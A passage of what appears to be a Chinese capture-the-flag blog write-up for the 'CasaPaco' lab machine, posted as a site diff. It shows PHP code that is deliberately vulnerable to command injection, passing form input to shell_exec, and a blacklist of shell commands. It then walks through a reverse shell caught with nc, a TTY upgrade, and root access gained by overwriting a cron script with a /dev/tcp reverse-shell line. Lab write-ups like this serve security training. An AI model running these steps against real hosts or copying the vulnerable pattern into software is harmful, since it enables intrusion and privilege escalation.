+<span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>header<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span>Casa Paco - Pedido para Llevar<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+    <span class="pl-k">&lt;</span>/header<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span>main<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>h<span class="pl-k">2&gt;</span>Haz tu pedido para llevar<span class="pl-k">&lt;</span>/h<span class="pl-k">2&gt;</span>
+        <span class="pl-k">&lt;</span>form action=<span class="pl-s"><span class="pl-pds">"</span>llevar.php<span class="pl-pds">"</span></span> method=<span class="pl-s"><span class="pl-pds">"</span>POST<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>order-form<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>label for=<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Nombre:<span class="pl-k">&lt;</span>/label<span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> id=<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span> placeholder=<span class="pl-s"><span class="pl-pds">"</span>Tu nombre<span class="pl-pds">"</span></span> required&gt;&lt;br<span class="pl-k">&gt;</span>
+          
+            <span class="pl-k">&lt;</span>label for=<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Plato:<span class="pl-k">&lt;</span>/label<span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> id=<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span> placeholder=<span class="pl-s"><span class="pl-pds">"</span>Ejemplo: Pizza<span class="pl-pds">"</span></span> required&gt;&lt;br<span class="pl-k">&gt;</span>
+          
+            <span class="pl-k">&lt;</span>button type=<span class="pl-s"><span class="pl-pds">"</span>submit<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>btn<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Enviar Pedido<span class="pl-k">&lt;</span>/button<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>/form<span class="pl-k">&gt;</span>
+
+        <span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+        <span class="pl-k">if</span> (<span class="pl-smi">$_SERVER</span>[<span class="pl-s"><span class="pl-pds">"</span>REQUEST_METHOD<span class="pl-pds">"</span></span>] == <span class="pl-s"><span class="pl-pds">"</span>POST<span class="pl-pds">"</span></span>) {
+            <span class="pl-smi">$name</span> = htmlspecialchars(<span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span>])<span class="pl-k">;</span> // Sanitizamos para evitar errores visuales
+            <span class="pl-smi">$dish</span> = <span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span>]<span class="pl-k">;</span> // Intencionalmente sin sanitizar para la vulnerabilidad
+
+            // Comando vulnerable
+            <span class="pl-smi">$output</span> = shell_exec(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$dish</span><span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+
+            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;section class="confirmation"&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;h3&gt;Pedido confirmado&lt;/h3&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;p&gt;Gracias, &lt;strong&gt;<span class="pl-smi">$name</span>&lt;/strong&gt;. Tu pedido de &lt;strong&gt;<span class="pl-smi">$dish</span>&lt;/strong&gt; está listo para llevar.&lt;/p&gt;<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;h3&gt;Salida del Comando:&lt;/h3&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;pre&gt;<span class="pl-smi">$output</span>&lt;/pre&gt;<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;/section&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+        }
+        <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/main<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span>footer<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>p<span class="pl-k">&gt;&amp;</span>copy<span class="pl-k">;</span> 2025 Casa Paco. Todos los derechos reservados.<span class="pl-k">&lt;</span>/p<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/footer<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
+<p>实现的和<code class="notranslate">llevar.php</code>一样，但是他没有<strong>限制</strong>，但是你不<strong>锁死</strong>这个网页，他就会把你的命令交给<code class="notranslate">llevar.php</code>执行，就寄寄，下面是<code class="notranslate">llevar.php</code>的代码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>es<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>meta charset=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>meta name=<span class="pl-s"><span class="pl-pds">"</span>viewport<span class="pl-pds">"</span></span> content=<span class="pl-s"><span class="pl-pds">"</span>width=device-width, initial-scale=1.0<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Casa Paco - Pedido para Llevar<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>link rel=<span class="pl-s"><span class="pl-pds">"</span>stylesheet<span class="pl-pds">"</span></span> href=<span class="pl-s"><span class="pl-pds">"</span>static/styles.css<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>header<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span>Casa Paco - Pedido para Llevar<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+    <span class="pl-k">&lt;</span>/header<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span>main<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>h<span class="pl-k">2&gt;</span>Haz tu pedido para llevar<span class="pl-k">&lt;</span>/h<span class="pl-k">2&gt;</span>
+        <span class="pl-k">&lt;</span>form action=<span class="pl-s"><span class="pl-pds">"</span>llevar.php<span class="pl-pds">"</span></span> method=<span class="pl-s"><span class="pl-pds">"</span>POST<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>order-form<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>label for=<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Nombre:<span class="pl-k">&lt;</span>/label<span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> id=<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span> placeholder=<span class="pl-s"><span class="pl-pds">"</span>Tu nombre<span class="pl-pds">"</span></span> required&gt;&lt;br<span class="pl-k">&gt;</span>
+
+            <span class="pl-k">&lt;</span>label for=<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Plato:<span class="pl-k">&lt;</span>/label<span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> id=<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span> placeholder=<span class="pl-s"><span class="pl-pds">"</span>Ejemplo: Cocido<span class="pl-pds">"</span></span> required&gt;&lt;br<span class="pl-k">&gt;</span>
+
+            <span class="pl-k">&lt;</span>button type=<span class="pl-s"><span class="pl-pds">"</span>submit<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>btn<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Enviar Pedido<span class="pl-k">&lt;</span>/button<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>/form<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/main<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+    <span class="pl-k">if</span> (<span class="pl-smi">$_SERVER</span>[<span class="pl-s"><span class="pl-pds">"</span>REQUEST_METHOD<span class="pl-pds">"</span></span>] === <span class="pl-s"><span class="pl-pds">"</span>POST<span class="pl-pds">"</span></span>) {
+        <span class="pl-smi">$name</span> = htmlspecialchars(<span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>name<span class="pl-pds">"</span></span>])<span class="pl-k">;</span>
+        <span class="pl-smi">$dish</span> = <span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>dish<span class="pl-pds">"</span></span>]<span class="pl-k">;</span>
+
+        // Filtrar comandos potencialmente peligrosos
+        <span class="pl-smi">$blacklist_pattern</span> = <span class="pl-s"><span class="pl-pds">'</span>/\b(whoami|ls|pwd|cat|sh|bash)\b/i<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+        <span class="pl-k">if</span> (preg_match(<span class="pl-smi">$blacklist_pattern</span>, <span class="pl-smi">$dish</span>)) {
+            die(<span class="pl-s"><span class="pl-pds">'</span>&lt;p style="color: red;"&gt;Error: Pedido comprometido.&lt;/p&gt;<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
+        }
+
+        // Permitir solo caracteres válidos
+        <span class="pl-smi">$allowed_pattern</span> = <span class="pl-s"><span class="pl-pds">'</span>/^[a-zA-Z0-9\s\-_\.]+$/<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+        <span class="pl-k">if</span> (<span class="pl-k">!</span>preg_match(<span class="pl-smi">$allowed_pattern</span>, <span class="pl-smi">$dish</span>)) {
+            die(<span class="pl-s"><span class="pl-pds">'</span>&lt;p style="color: red;"&gt;Error: Pedido contiene caracteres no permitidos.&lt;/p&gt;<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
+        }
+
+        // Ejecutar comando (no debe ser usado en un entorno de producción sin validaciones más estrictas)
+        <span class="pl-smi">$output</span> = shell_exec(<span class="pl-smi">$dish</span>)<span class="pl-k">;</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;section class="confirmation"&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;h3&gt;Pedido confirmado&lt;/h3&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;p&gt;Gracias, &lt;strong&gt;<span class="pl-smi">$name</span>&lt;/strong&gt;. Tu pedido de &lt;strong&gt;<span class="pl-smi">$dish</span>&lt;/strong&gt; estará listo para llevar.&lt;/p&gt;<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;h3&gt;Salida del Comando:&lt;/h3&gt;<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;pre&gt;<span class="pl-smi">$output</span>&lt;/pre&gt;<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;/section&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+    }
+    <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+  
+    <span class="pl-k">&lt;</span>footer<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>p<span class="pl-k">&gt;&amp;</span>copy<span class="pl-k">;</span> 2025 Casa Paco. Todos los derechos reservados.<span class="pl-k">&lt;</span>/p<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/footer<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
+</pre></div>
+<p>那就简单了我们锁死<code class="notranslate">llevar1.php</code>提交命令就好了</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06"><img src="https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06" alt="image" style="max-width: 100%;"></a></p>
+<p>要进行<strong>base64绕过</strong>，不然执行不了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888                                  
+listening on [any] 8888 ...
+id
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002
+bash: cannot <span class="pl-c1">set</span> terminal process group (534): Inappropriate ioctl <span class="pl-k">for</span> device
+bash: no job control <span class="pl-k">in</span> this shell
+www-data@Thehackerslabs-CasaPaco:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre></div>
+<h1>3. 获得稳定的 Shell</h1>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<h1>4.提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Thehackerslabs-CasaPaco:/var/www/html$ <span class="pl-c1">cd</span> /home/
+www-data@Thehackerslabs-CasaPaco:/home$ ls -la
+total 12
+drwxr-xr-x  3 root        root        4096 Jan 14 16:52 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..
+drwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente
+www-data@Thehackerslabs-CasaPaco:/home$ <span class="pl-c1">cd</span> pacogerente/
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al
+total 36
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..
+lrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
+-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local
+-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
+-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh
+-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt
+-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+<span class="pl-c"><span class="pl-c">#</span> Generar un log de actividad</span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Ejecutado por cron el: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> /home/pacogerente/log.txt
+</pre></div>
+<p>写个脚本覆盖掉<code class="notranslate">fabada.sh</code>就行了（不要问我为什么不看<code class="notranslate">pspy</code>，我看它长的都像定时任务☝( ◠‿◠ )☝）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ <span class="pl-c1">echo</span> -e <span class="pl-s"><span class="pl-pds">'</span>#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> fabada.
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+/bin/bash -i <span class="pl-k">&gt;&amp;</span> /dev/tcp/192.168.205.141/8889 <span class="pl-k">0&gt;&amp;1</span></pre></div>
+<p>等一会，它定时挺快的</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8889
+listening on [any] 8889 ...
+iconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802
+bash: no se puede establecer el grupo de proceso de terminal (4096): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@Thehackerslabs-CasaPaco:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> d</span>
+id
+uid=0(root) gid=0(root) grupos=0(root)
+</pre></div>
+<p>下班</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
